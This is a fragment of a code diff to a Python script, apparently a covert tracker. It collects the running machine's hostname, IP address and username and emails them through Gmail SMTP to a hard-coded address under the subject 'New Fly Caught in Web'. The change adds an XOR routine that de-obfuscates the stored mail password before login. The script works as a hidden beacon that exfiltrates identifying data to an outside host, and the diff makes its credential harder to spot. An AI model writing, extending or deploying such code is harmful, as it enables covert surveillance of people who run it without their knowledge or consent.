@@ -8,10 +8,14 @@ import winsound
 import socket
 import smtplib 
 
+xor_key = "6yH2jU9kR8nQ"
+
 def run():
     for x in range(5):
         winsound.Beep(3000,50)
 run()
+def xor_cipher(text, key):
+    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
 
 def spider_web():
     hostname = socket.gethostname()
@@ -19,14 +23,15 @@ def spider_web():
     user = os.getlogin()
     email_name = "emailtrap71@gmail.com"
     with open("E:/umad/key.txt", "r") as key:
-        passw = key.read()
+        passw = key.read().strip()
+        deobfuscated_key = xor_cipher(passw, xor_key)
         key.close()
     subject = "New Fly Caught in Web"
-    body = "New fly caught @ " + hostname + ": " + ip + " " + user
+    body = f"Fly Caught Hostname: {hostname} Ip: {ip} Username: {user}"
     email_message = f"Subject: {subject}\n\n{body}"
     try:
         server = smtplib.SMTP_SSL("smtp.gmail.com",465)
-        server.login(email_name,passw)
+        server.login(email_name,deobfuscated_key)
         server.sendmail(email_name,email_name,email_message)
         server.quit()
     except Exception as e:
